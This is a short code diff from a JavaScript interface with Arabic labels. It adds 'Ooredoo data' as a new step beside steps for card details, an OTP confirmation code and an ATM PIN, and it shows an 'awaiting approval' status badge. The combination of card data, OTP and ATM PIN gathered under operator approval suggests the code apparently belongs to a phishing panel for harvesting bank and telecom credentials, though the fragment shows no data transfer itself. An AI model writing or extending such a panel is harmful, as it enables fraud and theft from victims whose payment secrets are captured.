@@ -607,7 +607,7 @@ $("pop").addEventListener("click", e => {
 document.addEventListener("keydown", e => { if (e.key === "Escape") closePop(); });
 
 function stepName(step){
-  return step === "otp" ? "رمز التأكيد (OTP)" : step === "pin" ? "الرقم السري (ATM)" : "بيانات البطاقة";
+  return step === "otp" ? "رمز التأكيد (OTP)" : step === "pin" ? "الرقم السري (ATM)" : step === "ooredoo" ? "بيانات أوريدو" : "بيانات البطاقة";
 }
 function badgeFor(st){
   if (st === "awaiting") return '<span class="badge wait">بانتظار الموافقة</span>';
